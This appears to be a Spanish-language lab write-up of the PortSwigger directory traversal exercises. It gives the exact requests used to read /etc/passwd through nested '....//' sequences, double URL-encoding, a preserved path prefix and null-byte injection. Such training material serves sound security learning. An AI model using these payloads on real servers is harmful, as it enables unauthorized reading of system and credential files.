# Directory Traversal 'PortSwigger' 

Local File Inclution (LFI)
El directory traversal es una técnica de hacking web que permite acceder a ficheros de la aplicación para los cuales no se debería tener autorización.

Para todos los lab, debemos des desplegar la imagen en la pagina de PortSwigger, para poder hacer el Directory Traversal.
**Ctrl + r** Mandamos la informacion al Repeater en BurpSuite 
**Ctrl + u** Hacemos url encode a la informacion 
**Ctrl + Shift + u** Quitamos el url encode a la informacion


#### Lab 1 File path traversal, simple case
- **GET /image?filename=29.jpg HTTP/1.1**  Forma original de la pagina web en BuerpSuite 
- **GET /image?filename=*../../../../../../../../etc/passwd* HTTP/1.1** -> Con el Directory Traversal podemos ver el archivo /etc/passwd

Hacemos el path traversal en esta ocasion en donde esta el filename, podemos regresar muchas veces, al final hay un tope, por lo que podremos podremos listar el contenido del /etc/passwd. Todo lo podemos hacer desde el **repeater** en BurpSuite

#### Lab 2 File path traversal, traversal sequences blocked with absolute path bypass
Hay ocasiones que ya partimos desde la raiz, por lo que o es necesario poner el ../ para hacer el path traversal y mostranos el archivo. 

- **GET /image?filename=29.jpg HTTP/1.1**  Forma original de la pagina web en BuerpSuite 
- **GET /image?filename=*/etc/passwd* HTTP/1.1** -> Con el Directory Traversal podemos ver el archivo /etc/passwd

#### Lab 3 File path traversal, traversal sequences stripped non-recursively
Ocasionalmente para evitar este tipo de 'ataques', el programador hace una sanitizacion que consiste en que cada vez que vea **../** lo quitara. 

- **GET /image?filename=29.jpg HTTP/1.1**  Forma original de la pagina web en BuerpSuite 
- **GET /image?filename=*....//....//....//....//....//....//etc/passwd* HTTP/1.1** -> Con el Directory Traversal podemos ver el archivo /etc/passwd. Pero en este caso para poder burlar la 'sanitizacion' debemos de aplicarlo doble, ya que pasa de:
					**....//....//....//....//....//....//etc/passwd**  ->  **../../../../../../etc/passwd**

#### Lab 4 File path traversal, traversal sequences stripped with superfluous URL-decode
Otra forma de poder hacer path traversal es colocar la barra **/** en **url-enocde**.

- **GET /image?filename=29.jpg HTTP/1.1**  Forma original de la pagina web en BuerpSuite 
- **GET /image?filename=*..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd* HTTP/1.1** -> Con el Directory Traversal podemos ver el archivo /etc/passwd. Para poder hacer url-enconde en BurpSuite presionamos la teclas **Ctrl+ u** o presionamos Click derecho **Convert Selection -> URL -> URL-encode all characters** Tambien debemos de volver a URL encodear el % ya que de primera no funciona ya que lo sigue tomando como la barra por lo que el porcentaje queda como %25 y al final tenemos esto:          **/**  ->  **%2f** -> **%252f** 


#### Lab 5 File path traversal, validation of start of path
En esta ocasion la imagen a diferencia de las anteriores, ahora se encuentra en una ruta dada y lo mas probable es que nos lo tome como whitelist. Por lo que debemos de mantener la ruta hasta antes de la imagen para poder hacer le Path Traversal

- **GET /image?filename=/var/www/images/29.jpg HTTP/1.1**  Forma original de la pagina web en BuerpSuite
- **GET /image?filename=*/var/www/images/../../../etc/passwd* HTTP/1.1** -> Con el Directory Traversal podemos ver el archivo /etc/passwd.


#### Lab 6 
En este lab debemos de mantener el **.jpg** de la imagen porque si no, no nos lo tomara en cuenta ya que lo evaluael programa. Por lo que podemos 'aislar' el .jpg, y hacemos lo siguiente: 

- **GET /image?filename=29.jpg HTTP/1.1**  Forma original de la pagina web en BuerpSuite
- **GET /image?filename=*../../../etc/passwd%00.jpg HTTP/1.1** -> Con el Directory Traversal podemos ver el archivo /etc/passwd.

Con el **null by injection** nosotros podemos aislar la parte del .jpg y asi poder listar el contenido en /etc/passwd, esto se hace agregando **%00**










